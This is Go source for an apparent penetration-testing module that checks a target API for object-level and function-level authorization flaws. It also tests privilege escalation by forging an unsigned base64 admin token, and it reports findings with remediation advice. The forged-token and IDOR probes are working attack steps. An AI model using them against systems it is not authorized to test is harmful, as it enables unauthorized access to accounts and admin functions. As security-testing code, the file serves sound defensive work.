// Package authz assesses authorization: Broken Object Level Authorization
// (BOLA/IDOR), Broken Function Level Authorization (BFLA), and privilege
// escalation via token forgery. Every check is READ-ONLY. Destructive admin
// actions (e.g. account deletion) are detected as reachable but never executed.
package authz

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strconv"
	"strings"

	"autopen/internal/core"
	"autopen/internal/modules"
)

type Module struct{}

func (Module) Name() string  { return "authz" }
func (Module) Phase() string { return "authz" }

func (Module) Run(env modules.Env) error {
	userTok := env.State.Token("user")
	if userTok == "" {
		env.Logf("no authenticated session; skipping authorization checks")
		return nil
	}
	ownID, _ := parseUnsignedToken(env.State.GetFact("token_plaintext"))

	// --- BOLA / IDOR: read another object's data as a normal user ---
	for _, id := range []int{1, 2, 3} {
		if id == ownID {
			continue
		}
		resp, err := env.HTTP.Do(env.Ctx, "GET",
			fmt.Sprintf("%s/api/users/%d/workouts", env.Base, id),
			map[string]string{"Authorization": "Bearer " + userTok}, nil)
		if err != nil {
			return err
		}
		if resp.Status == 200 && strings.Contains(string(resp.Body), "workouts") &&
			!strings.Contains(string(resp.Body), `"workouts": []`) {
			env.State.AddFinding(core.Finding{
				ID: "bola-workouts", Title: "Broken Object Level Authorization (BOLA/IDOR)",
				Severity: core.SevHigh, Phase: "authz", OWASP: "API1:2019", Target: env.Base,
				Evidence:  fmt.Sprintf("as user id %d, GET /api/users/%d/workouts returned another user's data (HTTP 200)", ownID, id),
				Impact:    "Any authenticated user can read any other user's private records by changing the id.",
				Remediate: "Enforce an ownership check: the authenticated principal must match (or be authorized for) the requested object.",
			})
			env.Logf("BOLA confirmed: read user %d's workouts as user %d", id, ownID)
			break
		}
	}

	// --- BFLA: reach an admin-only function as a regular user ---
	resp, err := env.HTTP.Do(env.Ctx, "GET", env.Base+"/api/admin/users",
		map[string]string{"Authorization": "Bearer " + userTok}, nil)
	if err != nil {
		return err
	}
	if resp.Status == 200 && strings.Contains(string(resp.Body), "users") {
		env.State.AddFinding(core.Finding{
			ID: "bfla-admin", Title: "Broken Function Level Authorization (BFLA)",
			Severity: core.SevHigh, Phase: "authz", OWASP: "API5:2019", Target: env.Base,
			Evidence:  "a regular-user session received HTTP 200 from the admin-only endpoint GET /api/admin/users",
			Impact:    "Non-admin users can invoke administrative functions and read all accounts.",
			Remediate: "Verify the caller's role server-side on every privileged route; never trust a client-supplied role.",
		})
		env.Logf("BFLA confirmed: regular user reached /api/admin/users")
	}

	// --- Privilege escalation via token forgery (only if token is unsigned) ---
	if env.State.GetFact("token_scheme") == "unsigned-base64" {
		forged := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("%d:admin", maxInt(ownID, 1))))
		resp, err := env.HTTP.Do(env.Ctx, "GET", env.Base+"/api/admin/users",
			map[string]string{"Authorization": "Bearer " + forged}, nil)
		if err != nil {
			return err
		}
		if resp.Status == 200 {
			env.State.SetToken("admin_forged", forged)
			env.State.AddFinding(core.Finding{
				ID: "privesc-token-forgery", Title: "Privilege escalation via forged admin token",
				Severity: core.SevCritical, Phase: "authz", OWASP: "API2:2019", Target: env.Base,
				Evidence:  "a locally-forged token with role=admin was accepted by the admin endpoint (HTTP 200)",
				Impact:    "An attacker can self-elevate to administrator without any admin credentials.",
				Remediate: "Sign tokens server-side and verify the signature; derive role from trusted server state, not the token payload.",
			})
			env.Logf("privilege escalation confirmed via forged admin token")
		}
	}

	// --- Destructive admin action: detect reachability, DO NOT execute ---
	// A real engagement would stop here and report. We deliberately never send
	// the DELETE; we only note the route exists from recon/BFLA evidence.
	if env.State.HasFindingPhase("authz") {
		env.State.SetFact("destructive_admin_route", "/api/admin/users/<id> [DELETE] — reachable but intentionally NOT exercised")
		env.Logf("note: destructive admin route present; not exercised (non-destructive policy)")
	}
	return nil
}

func parseUnsignedToken(plaintext string) (int, string) {
	if plaintext == "" {
		return 0, ""
	}
	parts := strings.SplitN(plaintext, ":", 2)
	id, _ := strconv.Atoi(parts[0])
	role := ""
	if len(parts) > 1 {
		role = parts[1]
	}
	return id, role
}

func maxInt(a, b int) int {
	if a > b {
		return a
	}
	return b
}

var _ = json.Marshal // reserved for future structured parsing
